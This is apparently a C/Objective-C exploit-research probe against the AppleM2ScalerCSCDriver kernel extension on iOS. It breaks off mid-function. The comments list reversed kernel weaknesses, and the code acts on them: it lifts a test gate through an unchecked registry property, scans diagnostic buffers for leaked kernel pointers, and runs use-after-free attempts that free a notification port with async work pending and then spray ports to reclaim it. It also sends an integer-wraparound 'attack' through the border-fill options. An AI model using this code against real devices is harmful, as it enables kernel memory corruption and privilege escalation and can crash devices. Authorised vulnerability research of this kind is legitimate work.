// Target: AppleM2ScalerCSCDriver — probe v12 (kernel-reversing driven)
// Kernel side (macOS 27 kext disasm) established:
//  - sel 6 gate 0x2e2 = runtimeProperty "EnableKernelTests" (+0x18) == 0;
//    setProperties has NO permission checks -> try IORegistryEntrySetRegistryProperty.
//    args: +0 count (0x3e8 required by testStress), +4 surfaceIDs[count], +0xfa4 bit0=1.
//  - sel 1 +0x08..+0x18 = asyncRef (kernel-set), not user objects.
//  - registerNotificationPort override: no super, no retain on ipc_port_t,
//    no release in clientClose -> UAF candidate: deallocate port with
//    async transforms in flight -> sendAsyncResult64 on dangling port.
//  - sel 8 GetDiag returns raw kernel log_activity buffers (infoleak surface).
//  - crop/dst fixed16 -> fcvtzu without visible clamping in userclient layer.
// v12 phases:
//   P0 EnableKernelTests=1 via registry property
//   P1 sel 6 KernelTests with 1000 real surfaces (if ungated)
//   P2 GetDiag full dump + kernel-pointer scan
//   P3 fixed16 extreme fuzz on sel 1
//   P4 notification port UAF attempts (LAST - may panic)
//   P5 steady fuzz if alive
#include "fuzz.h"
#include <signal.h>
#include <IOSurface/IOSurfaceRef.h>
#include <Foundation/Foundation.h>
#include <UIKit/UIKit.h>
#include <ImageIO/ImageIO.h>
#include <AVFoundation/AVFoundation.h>
#include <objc/runtime.h>
#include <objc/message.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdarg.h>

// exported by iOS IOKit binary but marked unavailable in SDK headers
extern kern_return_t set_cf_property_ios(io_registry_entry_t entry,
                                         CFStringRef key, CFTypeRef value)
    __asm("_IORegistryEntrySetCFProperty");
extern kern_return_t ioconnect_trap1(io_connect_t, uint32_t, uintptr_t)
    __asm("_IOConnectTrap1");
extern kern_return_t ioconnect_trap4(io_connect_t, uint32_t, uintptr_t, uintptr_t, uintptr_t, uintptr_t)
    __asm("_IOConnectTrap4");

static mach_port_t g_wake, g_notify;

static void *msg_listener(void *arg) {
    mach_port_t port = (mach_port_t)(uintptr_t)arg;
    struct { mach_msg_header_t h; uint8_t data[0x400]; } msg;
    for (;;) {
        kern_return_t kr = mach_msg(&msg.h, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0,
                                    sizeof(msg), port, 1000, MACH_PORT_NULL);
        if (kr == MACH_RCV_TIMED_OUT) continue;
        if (kr) { LOG("[rx 0x%x] err 0x%x", port, kr); continue; }
        uint32_t *d = (uint32_t *)&msg;
        LOG("[rx 0x%x] MSG id 0x%x size %u: %08x %08x %08x %08x | %08x %08x %08x %08x",
            port, msg.h.msgh_id, msg.h.msgh_size,
            d[6], d[7], d[8], d[9], d[10], d[11], d[12], d[13]);
    }
    return NULL;
}

static IOSurfaceRef make_surface_fmt(int w, int h, int bpe, int fmt) {
    CFNumberRef W = CFNumberCreate(NULL, kCFNumberIntType, &w);
    CFNumberRef H = CFNumberCreate(NULL, kCFNumberIntType, &h);
    CFNumberRef B = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
    CFNumberRef F = CFNumberCreate(NULL, kCFNumberIntType, &fmt);
    const void *keys[] = { kIOSurfaceWidth, kIOSurfaceHeight, kIOSurfaceBytesPerElement, kIOSurfacePixelFormat };
    const void *vals[] = { W, H, B, F };
    CFDictionaryRef props = CFDictionaryCreate(NULL, keys, vals, 4,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    IOSurfaceRef s = IOSurfaceCreate(props);
    CFRelease(props); CFRelease(W); CFRelease(H); CFRelease(B); CFRelease(F);
    return s;
}
static IOSurfaceRef make_surface(int w, int h) {
    return make_surface_fmt(w, h, 4, 0x42475241);
}

static io_connect_t g_conn;
static IOSurfaceRef g_sf1, g_sf2;
static uint8_t *g_req, *g_out, *g_hist, *g_estout, *g_coeffs;
static IOSurfaceID g_s1, g_s2;
static IOSurfaceID *g_ids; static int g_nids;

static void hexdump(const char *tag, const uint8_t *p, size_t n) {
    for (size_t i = 0; i < n; i += 16)
        LOG("%s +%03zx: %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x",
            tag, i, p[i], p[i+1], p[i+2], p[i+3], p[i+4], p[i+5], p[i+6], p[i+7],
            p[i+8], p[i+9], p[i+10], p[i+11], p[i+12], p[i+13], p[i+14], p[i+15]);
}

static void craft_transform(uint8_t *r, IOSurfaceID src, IOSurfaceID dst, int w, int h) {
    memset(r, 0, 0x1b0);
    *(uint32_t *)(r + 0x00) = src;
    *(uint32_t *)(r + 0x04) = dst;
    *(uint64_t *)(r + 0x20) = 0x3000 | (1ULL << 15);
    *(uint64_t *)(r + 0x38) = (uint64_t)w << 16;
    *(uint64_t *)(r + 0x40) = (uint64_t)h << 16;
    *(uint32_t *)(r + 0x48) = w;
    *(uint32_t *)(r + 0x4c) = h;
    *(uint32_t *)(r + 0x68) = w;
    *(uint32_t *)(r + 0x6c) = h;
    *(uint32_t *)(r + 0x70) = w;
    *(uint32_t *)(r + 0x74) = h;
}

static kern_return_t call_struct(uint32_t sel, const void *in, size_t insz,
                                 void *out, size_t *outsz) {
    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
    return IOConnectCallMethod(g_conn, sel, NULL, 0, in, insz, osc, &nosc, out, outsz);
}

static kern_return_t call_async1(const void *in, void *out, size_t outsz, uint64_t ref) {
    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
    return IOConnectCallAsyncMethod(g_conn, 1, g_wake, &ref, 1,
                                    NULL, 0, in, 0x1b0, osc, &nosc, out, &outsz);
}

// P0: try to lift the KernelTests gate via registry property
static int p0_enable_tests(void) {
    LOG("[v12-0] EnableKernelTests attempt");
    io_service_t svc = IOServiceGetMatchingService(kIOMainPortDefault,
                        IOServiceMatching("AppleM2ScalerCSCDriver"));
    if (!svc) { LOG("[p0] service not found"); return 0; }
    int one = 1;
    CFNumberRef n = CFNumberCreate(NULL, kCFNumberIntType, &one);
    kern_return_t kr = set_cf_property_ios(svc, CFSTR("EnableKernelTests"), n);
    LOG("[p0] SetCFProperty EnableKernelTests=1 -> 0x%08x", kr);
    CFTypeRef val = IORegistryEntryCreateCFProperty(svc, CFSTR("EnableKernelTests"), NULL, 0);
    LOG("[p0] readback: %s", val ? "present" : "absent");
    if (val) CFRelease(val);
    // also try boolean
    if (kr != 0) {
        kr = set_cf_property_ios(svc, CFSTR("EnableKernelTests"), kCFBooleanTrue);
        LOG("[p0] retry with boolean -> 0x%08x", kr);
    }
    CFRelease(n);
    IOObjectRelease(svc);
    // probe sel 6 quickly
    memset(g_req, 0, 0xfa8);
    *(uint32_t *)g_req = 1;
    g_req[0xfa4] = 1;
    kern_return_t k6 = call_struct(6, g_req, 0xfa8, NULL, NULL);
    LOG("[p0] sel 6 probe -> 0x%08x (%s)", k6, k6 == 0xe00002e2 ? "still gated" : "CHANGED");
    return k6 != 0xe00002e2;
}

// P1: KernelTests with 1000 surfaces
static void p1_kerneltests(void) {
    LOG("[v12-1] KernelTests with real surfaces");
    g_ids = malloc(1000 * sizeof(IOSurfaceID));
    g_nids = 0;
    for (int i = 0; i < 1000; i++) {
        IOSurfaceRef s = make_surface(64, 64);
        if (!s) { LOG("[p1] surface create failed at %d", i); break; }
        g_ids[g_nids++] = IOSurfaceGetID(s);   // intentionally leak refs
        if ((i & 0x7f) == 0) usleep(1000);
    }
    LOG("[p1] created %d surfaces [%u..%u]", g_nids, g_ids[0], g_ids[g_nids-1]);
    if (g_nids < 1000) { LOG("[p1] not enough surfaces, skip"); return; }
    memset(g_req, 0, 0xfa8);
    *(uint32_t *)g_req = 0x3e8;
    memcpy(g_req + 4, g_ids, 1000 * 4);
    g_req[0xfa4] = 1;
    LOG("[p1] sel 6 count=0x3e8 GO");
    kern_return_t kr = call_struct(6, g_req, 0xfa8, NULL, NULL);
    LOG("[p1] sel 6 -> 0x%08x (device survived)", kr);
    usleep(5000000);
    LOG("[p1] post-wait alive");
}

// P2: GetDiag full dump + pointer scan (kernel-side len can reach ~40KB)
static void p2_diag_leak(void) {
    LOG("[v12-2] GetDiag dump + pointer scan (64KB buffer)");
    size_t bufsz = 0x10000;
    uint8_t *big = must_map(bufsz);
    memset(big, 0, bufsz);
    *(uint32_t *)big = 0x6944506b;
    uint64_t va = (uint64_t)(uintptr_t)big;
    kern_return_t kr = call_struct(8, &va, 8, NULL, NULL);
    LOG("[p2] sel 8 -> 0x%08x", kr);
    hexdump("[p2]", big, 0x100);
    int found = 0;
    size_t lastnz = 0;
    for (size_t i = 0; i + 8 <= bufsz; i += 8) {
        uint64_t v = *(uint64_t *)(big + i);
        if (v) lastnz = i;
        if ((v >> 40) == 0xfffffe || (v >> 40) == 0xffffff || (v >> 40) == 0xfffffd) {
            LOG("[p2] ptr-like @+0x%zx: %016llx", i, v);
            if (++found > 30) break;
        }
    }
    LOG("[p2] ptr-like count: %d, last nonzero qword @+0x%zx", found, lastnz);
    vm_deallocate(mach_task_self(), (vm_address_t)big, bufsz);
}

// P3: fixed16 extremes on sel 1
static void p3_fixed16(void) {
    LOG("[v12-3] fixed16 extreme fuzz");
    static const uint64_t ex[] = {
        0, 1, 0xffff, 0x10000, 0x7fffffff, 0x80000000ULL, 0xffffffffULL,
        0x100000000ULL, 0xffffffffffffffffULL, 0x00007fff00000000ULL,
        0x400000000000ULL, 0xffff00000000ULL
    };
    for (unsigned i = 0; i < sizeof(ex)/8; i++) {
        for (int field = 0; field < 4; field++) {
            craft_transform(g_req, g_s1, g_s2, 64, 64);
            *(uint64_t *)(g_req + 0x28 + field * 8) = ex[i];
            kern_return_t kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
            if (kr != 0 && kr != 0xe00002c2 && kr != 0xe00002f0)
                LOG("[p3] ex[%u]=%016llx field %d -> kr 0x%08x", i, ex[i], field, kr);
        }
    }
    // dst rect raw extremes
    for (unsigned i = 0; i < sizeof(ex)/8; i++) {
        craft_transform(g_req, g_s1, g_s2, 64, 64);
        *(uint64_t *)(g_req + 0x60) = ex[i];
        *(uint64_t *)(g_req + 0x68) = ex[i];
        kern_return_t kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
        if (kr != 0 && kr != 0xe00002c2 && kr != 0xe00002f0)
            LOG("[p3] dstrect ex[%u]=%016llx -> kr 0x%08x", i, ex[i], kr);
    }
    // dims extremes
    static const uint32_t dims[] = { 0, 1, 0x4000, 0x8000, 0x10000, 0x7fffffff, 0xffffffff };
    for (unsigned i = 0; i < sizeof(dims)/4; i++) {
        craft_transform(g_req, g_s1, g_s2, 64, 64);
        *(uint32_t *)(g_req + 0x70) = dims[i];
        *(uint32_t *)(g_req + 0x74) = dims[i];
        kern_return_t kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
        if (kr != 0 && kr != 0xe00002c2 && kr != 0xe00002f0)
            LOG("[p3] dim %08x -> kr 0x%08x", dims[i], kr);
    }
    LOG("[v12-3] done");
}

// P4: notification port UAF. LAST - may panic the device.
// Each attempt uses a FRESH connection: register a fresh port, submit async
// transforms on big surfaces, destroy the port while requests are in flight,
// then spray new ports to reclaim the freed ipc_port_t.
static void p4_port_uaf(void) {
    LOG("[v12-4] notification port UAF attempts (panic tolerated)");
    IOSurfaceRef big1 = make_surface(2048, 2048);
    IOSurfaceRef big2 = make_surface(2048, 2048);
    if (!big1 || !big2) { LOG("[uaf] big surfaces failed"); return; }
    for (int attempt = 0; attempt < 30; attempt++) {
        io_connect_t c2 = open_service("AppleM2ScalerCSCDriver", 0);
        if (!c2) { LOG("[uaf] open failed at %d", attempt); break; }
        mach_port_t p;
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p);
        kern_return_t kr = IOConnectSetNotificationPort(c2, 0, p, 0);
        if (kr) LOG("[uaf] attempt %d SetNotificationPort -> 0x%08x", attempt, kr);
        craft_transform(g_req, IOSurfaceGetID(big1), IOSurfaceGetID(big2), 2048, 2048);
        int submitted = 0;
        for (int i = 0; i < 32; i++) {
            uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
            uint64_t ref = 0xface0000 + i;
            memset(g_out, 0xAA, 0x2000);
            size_t osz = 0x2000;
            kern_return_t k2 = IOConnectCallAsyncMethod(c2, 1, g_wake, &ref, 1,
                                                        NULL, 0, g_req, 0x1b0,
                                                        osc, &nosc, g_out, &osz);
            if (k2 == 0xe00002bf || k2 == 0) submitted++;
        }
        // destroy the port while completions are pending
        mach_port_mod_refs(mach_task_self(), p, MACH_PORT_RIGHT_RECEIVE, -1);
        // reclaim: spray fresh ports into the freed slot
        mach_port_t spray[64];
        for (int i = 0; i < 64; i++)
            if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &spray[i]))
                break;
        usleep(200000);
        for (int i = 0; i < 64; i++) mach_port_destroy(mach_task_self(), spray[i]);
        IOServiceClose(c2);
        LOG("[uaf] attempt %d done, submitted %d", attempt, submitted);
    }
    CFRelease(big1); CFRelease(big2);
    LOG("[v12-4] done (still alive)");
}

// V14: empirical verification — does an oversize-declared transform actually
// execute (dst content changes) or get silently dropped? Also re-tests the
// same-format 0x2c2 anomaly on a completely fresh state.
static void surf_fill(IOSurfaceRef s, uint8_t v) {
    uint32_t seed = 0;
    if (IOSurfaceLock(s, 0, &seed)) { LOG("[v] lock failed"); return; }
    memset(IOSurfaceGetBaseAddress(s), v, IOSurfaceGetBytesPerRow(s) * IOSurfaceGetHeight(s));
    IOSurfaceUnlock(s, 0, &seed);
}
static uint32_t surf_sum(IOSurfaceRef s, int rows) {
    uint32_t seed = 0;
    if (IOSurfaceLock(s, kIOSurfaceLockReadOnly, &seed)) { LOG("[v] rlock failed"); return 0; }
    uint8_t *b = IOSurfaceGetBaseAddress(s);
    size_t bpr = IOSurfaceGetBytesPerRow(s);
    uint32_t sum = 0;
    for (int r = 0; r < rows; r++)
        for (size_t i = 0; i < bpr; i++) sum += b[r * bpr + i];
    LOG("[v] readback bpr %zu sum(%d rows) 0x%08x first %02x%02x%02x%02x",
        bpr, rows, sum, b[0], b[1], b[2], b[3]);
    IOSurfaceUnlock(s, kIOSurfaceLockReadOnly, &seed);
    return sum;
}
static void p_v14_verify(void) {
    LOG("[v14] verify phase (fresh state)");
    IOSurfaceRef A = make_surface(64, 64);
    IOSurfaceRef B = make_surface(64, 64);
    if (!A || !B) { LOG("[v] surface fail"); return; }
    // 1) same-format normal transform, fresh state
    surf_fill(A, 0x11); surf_fill(B, 0x22);
    surf_sum(A, 4); surf_sum(B, 4);
    craft_transform(g_req, IOSurfaceGetID(A), IOSurfaceGetID(B), 64, 64);
    kern_return_t kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
    LOG("[v] normal 64x64 same-fmt -> kr 0x%08x", kr);
    surf_sum(B, 4);
    // 2) oversize-declared transform
    surf_fill(B, 0x22);
    uint32_t before = surf_sum(B, 4);
    craft_transform(g_req, IOSurfaceGetID(A), IOSurfaceGetID(B), 64, 64);
    *(uint32_t *)(g_req + 0x70) = 4096;
    *(uint32_t *)(g_req + 0x74) = 4096;
    *(uint32_t *)(g_req + 0x68) = 4096;
    *(uint32_t *)(g_req + 0x6c) = 4096;
    kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
    LOG("[v] oversize dst 4096 -> kr 0x%08x", kr);
    uint32_t after = surf_sum(B, 4);
    LOG("[v] dst changed: %s (before 0x%08x after 0x%08x)",
        before != after ? "YES - executed" : "NO - dropped/clamped", before, after);
    // 3) cross-format sanity on fresh pair
    IOSurfaceRef Y = make_surface_fmt(64, 64, 1, 0x34323076);
    if (Y) {
        surf_fill(Y, 0x33);
        craft_transform(g_req, IOSurfaceGetID(A), IOSurfaceGetID(Y), 64, 64);
        kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
        LOG("[v] BGRA->420v fresh -> kr 0x%08x", kr);
        surf_sum(Y, 4);
    }
    // 4) g_s1 -> g_s2 for continuity with v10/v11
    if (g_sf1) {
        surf_fill(g_sf1, 0x44);
        craft_transform(g_req, g_s1, g_s2, 64, 64);
        kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
        LOG("[v] g_s1->g_s2 -> kr 0x%08x", kr);
    }
    // 5) sticky-state repro: same-fmt -> oversize -> same-fmt
    {
        IOSurfaceRef C = make_surface(64, 64);
        IOSurfaceRef D = make_surface(64, 64);
        IOSurfaceID c = IOSurfaceGetID(C), d = IOSurfaceGetID(D);
        craft_transform(g_req, c, d, 64, 64);
        kern_return_t k1 = call_struct(1, g_req, 0x1b0, NULL, NULL);
        usleep(50000);
        craft_transform(g_req, c, d, 64, 64);
        *(uint32_t *)(g_req + 0x70) = 4096;
        *(uint32_t *)(g_req + 0x74) = 4096;
        *(uint32_t *)(g_req + 0x68) = 4096;
        *(uint32_t *)(g_req + 0x6c) = 4096;
        kern_return_t k2 = call_struct(1, g_req, 0x1b0, NULL, NULL);
        usleep(50000);
        craft_transform(g_req, c, d, 64, 64);
        kern_return_t k3 = call_struct(1, g_req, 0x1b0, NULL, NULL);
        usleep(50000);
        craft_transform(g_req, c, d, 64, 64);
        kern_return_t k4 = call_struct(1, g_req, 0x1b0, NULL, NULL);
        LOG("[v] sticky repro: normal 0x%08x -> oversize 0x%08x -> normal 0x%08x -> normal 0x%08x",
            k1, k2, k3, k4);
    }
    LOG("[v14] done");
}

// state probe: fresh same-format transform on given connection
static kern_return_t state_probe(io_connect_t conn) {
    IOSurfaceRef C = make_surface(64, 64);
    IOSurfaceRef D = make_surface(64, 64);
    if (!C || !D) return KERN_FAILURE;
    uint8_t *req = must_map(0x1000);
    craft_transform(req, IOSurfaceGetID(C), IOSurfaceGetID(D), 64, 64);
    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
    kern_return_t kr = IOConnectCallMethod(conn, 1, NULL, 0, req, 0x1b0, osc, &nosc, NULL, NULL);
    vm_deallocate(mach_task_self(), (vm_address_t)req, 0x1000);
    return kr;
}
static void state_check(const char *tag) {
    kern_return_t k1 = state_probe(g_conn);
    io_connect_t c2 = open_service("AppleM2ScalerCSCDriver", 0);
    kern_return_t k2 = c2 ? state_probe(c2) : (kern_return_t)-1;
    if (c2) IOServiceClose(c2);
    LOG("[state] %s: same-conn 0x%08x, fresh-conn 0x%08x", tag, k1, k2);
}

static void p3b_boundary(void) {
    LOG("[v13-b] boundary sweep (declared dims vs real 64x64 surfaces)");
    static const uint32_t dcl[] = { 63, 64, 65, 96, 128, 256, 1024, 4096, 0x10000 };
    // 1) declared src dims larger than surface -> OOB read?
    for (unsigned i = 0; i < sizeof(dcl)/4; i++) {
        craft_transform(g_req, g_s1, g_s2, 64, 64);
        *(uint32_t *)(g_req + 0x48) = dcl[i];      // src w declared
        *(uint32_t *)(g_req + 0x4c) = dcl[i];      // src h declared
        *(uint64_t *)(g_req + 0x38) = (uint64_t)dcl[i] << 16;  // crop w
        *(uint64_t *)(g_req + 0x40) = (uint64_t)dcl[i] << 16;  // crop h
        kern_return_t kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
        LOG("[b] src declared %u -> kr 0x%08x", dcl[i], kr);
        usleep(2000);
        if (dcl[i] == 64 || dcl[i] == 4096) state_check("after-src-decl");
    }
    state_check("after-src-loop");
    // 2) declared dst dims larger than surface -> OOB write?
    for (unsigned i = 0; i < sizeof(dcl)/4; i++) {
        craft_transform(g_req, g_s1, g_s2, 64, 64);
        *(uint32_t *)(g_req + 0x70) = dcl[i];
        *(uint32_t *)(g_req + 0x74) = dcl[i];
        *(uint32_t *)(g_req + 0x68) = dcl[i];
        *(uint32_t *)(g_req + 0x6c) = dcl[i];
        kern_return_t kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
        LOG("[b] dst declared %u -> kr 0x%08x", dcl[i], kr);
        usleep(2000);
        if (dcl[i] == 64 || dcl[i] == 4096) state_check("after-dst-decl");
    }
    state_check("after-dst-loop");
    // 3) crop origin beyond surface edge
    static const uint32_t org[] = { 63, 64, 65, 128, 4096, 0x8000 };
    for (unsigned i = 0; i < sizeof(org)/4; i++) {
        craft_transform(g_req, g_s1, g_s2, 64, 64);
        *(uint64_t *)(g_req + 0x28) = (uint64_t)org[i] << 16;  // crop x
        *(uint64_t *)(g_req + 0x30) = (uint64_t)org[i] << 16;  // crop y
        kern_return_t kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
        if (kr != 0 && kr != 0xe00002c2 && kr != 0xe00002f0)
            LOG("[b] crop origin %u -> kr 0x%08x", org[i], kr);
        usleep(2000);
    }
    state_check("after-crop-loop");
    LOG("[v13-b] done");
}

// P3c: pixel-format confusion matrix
static void p3c_formats(void) {
    LOG("[v13-c] pixel-format confusion matrix");
    static const struct { int fmt; int bpe; const char *name; } fmts[] = {
        { 0x42475241, 4, "BGRA" },
        { 0x52474241, 4, "RGBA" },
        { 0x34323076, 1, "420v" },
        { 0x34323066, 1, "420f" },
        { 0x4c303872, 2, "L08r?" },
    };
    IOSurfaceID ids[5] = {0};
    for (int i = 0; i < 5; i++) {
        IOSurfaceRef s = make_surface_fmt(64, 64, fmts[i].bpe, fmts[i].fmt);
        if (s) ids[i] = IOSurfaceGetID(s);
        LOG("[c] surface %s -> id %u", fmts[i].name, ids[i]);
    }
    for (int a = 0; a < 5; a++) {
        if (!ids[a]) continue;
        for (int b = 0; b < 5; b++) {
            if (!ids[b]) continue;
            craft_transform(g_req, ids[a], ids[b], 64, 64);
            kern_return_t kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
            LOG("[c] %s -> %s : kr 0x%08x", fmts[a].name, fmts[b].name, kr);
            usleep(2000);
        }
    }
    LOG("[v13-c] done");
}

// P4b: UAF destroy-first variant. LAST - may panic the device.

// V16: candidate A — validateBorderFill 32-bit wraparound (MSR23 0x9880584):
//   check: selX+selW (32-bit wrap) <= realW; selX>0 keeps wrapped result.
//   selX=0xFFFFFFFE, selW=2 -> sum wraps to 0 -> passes; consumer writes
//   border fill at skewed rect. Requires crop_right + selW <= realW, so
//   crop is narrowed to real-2. Readback scan shows where writes landed.
static void surf_fill_full(IOSurfaceRef s, uint8_t v) {
    uint32_t seed = 0;
    if (IOSurfaceLock(s, 0, &seed)) return;
    memset(IOSurfaceGetBaseAddress(s), v,
           IOSurfaceGetBytesPerRow(s) * IOSurfaceGetHeight(s));
    IOSurfaceUnlock(s, 0, &seed);
}
static int surf_scan(IOSurfaceRef s, uint8_t expect, const char *tag) {
    uint32_t seed = 0;
    if (IOSurfaceLock(s, kIOSurfaceLockReadOnly, &seed)) { LOG("[A] rlock fail"); return -1; }
    uint8_t *b = IOSurfaceGetBaseAddress(s);
    size_t bpr = IOSurfaceGetBytesPerRow(s);
    size_t h = IOSurfaceGetHeight(s);
    int changed = 0;
    for (size_t r = 0; r < h && changed < 8; r++)
        for (size_t i = 0; i < bpr; i++)
            if (b[r * bpr + i] != expect) {
                LOG("[A] %s changed @row %zu col %zu: %02x (expect %02x)",
                    tag, r, i, b[r * bpr + i], expect);
                changed++;
                break;
            }
    IOSurfaceUnlock(s, kIOSurfaceLockReadOnly, &seed);
    return changed;
}

static void border_payload(uint8_t *r, IOSurfaceID src, IOSurfaceID dst,
                           uint32_t selX, uint32_t selY, uint32_t selW, uint32_t selH,
                           uint32_t dstRW, uint32_t dstRH) {
    craft_transform(r, src, dst, 64, 64);
    *(uint64_t *)(r + 0x38) = 62ULL << 16;   // crop w/h
    *(uint64_t *)(r + 0x40) = 62ULL << 16;
    *(uint32_t *)(r + 0x68) = dstRW;         // dst rect w/h (must satisfy dstW+W<=bufW)
    *(uint32_t *)(r + 0x6c) = dstRH;
    *(uint64_t *)(r + 0x20) |= (1ULL << 28); // BorderFill present
    *(uint32_t *)(r + 0xac) = selX;
    *(uint32_t *)(r + 0xb0) = selY;
    *(uint32_t *)(r + 0xb4) = selW;
    *(uint32_t *)(r + 0xb8) = selH;
    *(uint32_t *)(r + 0xbc) = 0xff;          // alpha: 2^n-1 valid
    *(uint32_t *)(r + 0xc0) = 0xff;          // R/Y:  2^n-1 valid
    *(uint32_t *)(r + 0xc4) = 0xff;          // G/Cb
    *(uint32_t *)(r + 0xc8) = 0xff;          // B/Cr
}

static void p_borderfill(void) {
    LOG("[v18-A] border fill probes (iOS validation mapped)");
    IOSurfaceRef src = make_surface(64, 64);
    IOSurfaceRef dst = make_surface(64, 64);
    if (!src || !dst) { LOG("[A] surface fail"); return; }
    IOSurfaceID si = IOSurfaceGetID(src), di = IOSurfaceGetID(dst);

    // baseline: dst rect 32x32 in 64x64 buffer, border 2,2 2x2 -> all checks pass
    surf_fill_full(dst, 0x22);
    border_payload(g_req, si, di, 2, 2, 2, 2, 32, 32);
    kern_return_t kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
    LOG("[A] baseline dstrect32 border 2,2 2x2 -> kr 0x%08x", kr);
    usleep(100000);
    if (kr == 0) surf_scan(dst, 0x22, "baseline");
    if (kr != 0) {
        // second baseline: 32-aligned W/H (align gate?) — X=2 Y=2 W=H=32, dstrect 32
        surf_fill_full(dst, 0x22);
        border_payload(g_req, si, di, 2, 2, 32, 32, 32, 32);
        kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
        LOG("[A] baseline2 32-aligned -> kr 0x%08x", kr);
        usleep(100000);
        if (kr == 0) surf_scan(dst, 0x22, "baseline2");
        if (kr != 0) { LOG("[A] border path gated on this HW (0x2c7)"); return; }
    }

    LOG("[v18-A] done (kill-shots moved to p_spray_oob)");
}

// V16: candidate B — extended-pixel +1 beyond real dims on full-frame 420
static void p_extpixel(void) {
    LOG("[v16-B] extended-pixel 420 full-frame probe");
    IOSurfaceRef src = make_surface_fmt(64, 64, 1, 0x34323066); // 420f
    IOSurfaceRef dst = make_surface_fmt(64, 64, 1, 0x34323066);
    if (!src || !dst) { LOG("[B] 420f surface fail"); return; }
    surf_fill_full(dst, 0x33);
    craft_transform(g_req, IOSurfaceGetID(src), IOSurfaceGetID(dst), 64, 64);
    // full-frame crop (already 64x64 by craft_transform)
    kern_return_t kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
    LOG("[B] 420f full-frame -> kr 0x%08x", kr);
    usleep(100000);
    surf_scan(dst, 0x33, "420f-fullframe");
    LOG("[v16-B] done");
}


// V17: drive the REAL IOSurfaceAccelerator API with hostile option values.
// Framework builds a guaranteed-valid 0x1b0 request; we supply a wrapped
// BorderFillX so the kernel-side 32-bit add in validateBorderFill wraps.
#include <dlfcn.h>
typedef IOReturn (*CreateFn)(CFAllocatorRef, CFDictionaryRef, void **);
typedef IOReturn (*TransformFn)(void *, IOSurfaceRef, IOSurfaceRef,
                                CFDictionaryRef, void *, void *);
static CFStringRef kstr(void *h, const char *name) {
    CFStringRef *p = (CFStringRef *)dlsym(h, name);
    return p ? *p : NULL;
}
static void p_realapi(void) {
    LOG("[v17] real API path");
    void *h = dlopen("/System/Library/PrivateFrameworks/IOSurfaceAccelerator.framework/IOSurfaceAccelerator", RTLD_NOW);
    if (!h) { LOG("[r] dlopen failed: %s", dlerror()); return; }
    CreateFn Create = (CreateFn)dlsym(h, "IOSurfaceAcceleratorCreate");
    TransformFn Transform = (TransformFn)dlsym(h, "IOSurfaceAcceleratorTransformSurface");
    LOG("[r] Create %p Transform %p", Create, Transform);
    if (!Create || !Transform) return;

    IOSurfaceRef src = make_surface(64, 64);
    IOSurfaceRef dst = make_surface(64, 64);
    if (!src || !dst) { LOG("[r] surfaces fail"); return; }
    void *acc = NULL;
    IOReturn kr = Create(NULL, NULL, &acc);
    LOG("[r] Create -> 0x%08x acc %p", kr, acc);
    if (kr || !acc) return;

    CFStringRef kX = kstr(h, "kIOSurfaceAcceleratorBorderFillX");
    CFStringRef kY = kstr(h, "kIOSurfaceAcceleratorBorderFillY");
    CFStringRef kW = kstr(h, "kIOSurfaceAcceleratorBorderFillWidth");
    CFStringRef kH = kstr(h, "kIOSurfaceAcceleratorBorderFillHeight");
    CFStringRef kR = kstr(h, "kIOSurfaceAcceleratorBorderFillRedY");
    CFStringRef kG = kstr(h, "kIOSurfaceAcceleratorBorderFillGreenCb");
    CFStringRef kB = kstr(h, "kIOSurfaceAcceleratorBorderFillBlueCr");
    LOG("[r] keys %p %p %p %p %p %p %p", kX, kY, kW, kH, kR, kG, kB);
    if (!kX || !kY || !kW || !kH || !kR || !kG || !kB) return;

    uint8_t rects[0x30]; memset(rects, 0, sizeof(rects));   // zero rects = valid

    int bx = 2, by = 2, bw = 2, bh = 2, col = 128;
    CFNumberRef nX = CFNumberCreate(NULL, kCFNumberIntType, &bx);
    CFNumberRef nY = CFNumberCreate(NULL, kCFNumberIntType, &by);
    CFNumberRef nW = CFNumberCreate(NULL, kCFNumberIntType, &bw);
    CFNumberRef nH = CFNumberCreate(NULL, kCFNumberIntType, &bh);
    CFNumberRef nC = CFNumberCreate(NULL, kCFNumberIntType, &col);

    // baseline: small valid border fill
    {
        const void *keys[] = { kX, kY, kW, kH, kR, kG, kB };
        const void *vals[] = { nX, nY, nW, nH, nC, nC, nC };
        CFDictionaryRef opts = CFDictionaryCreate(NULL, keys, vals, 7,
            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        surf_fill_full(dst, 0x22);
        kr = Transform(acc, src, dst, opts, rects, NULL);
        LOG("[r] baseline borderfill -> 0x%08x", kr);
        usleep(100000);
        surf_scan(dst, 0x22, "real-baseline");
        CFRelease(opts);
    }
    // attack: wrapped X
    {
        int wx = 0xFFFFFFFE;   // y stays 2 (> 0 transform offset)
        CFNumberRef nWX = CFNumberCreate(NULL, kCFNumberIntType, &wx);
        const void *keys[] = { kX, kY, kW, kH, kR, kG, kB };
        const void *vals[] = { nWX, nY, nW, nH, nC, nC, nC };
        CFDictionaryRef opts = CFDictionaryCreate(NULL, keys, vals, 7,
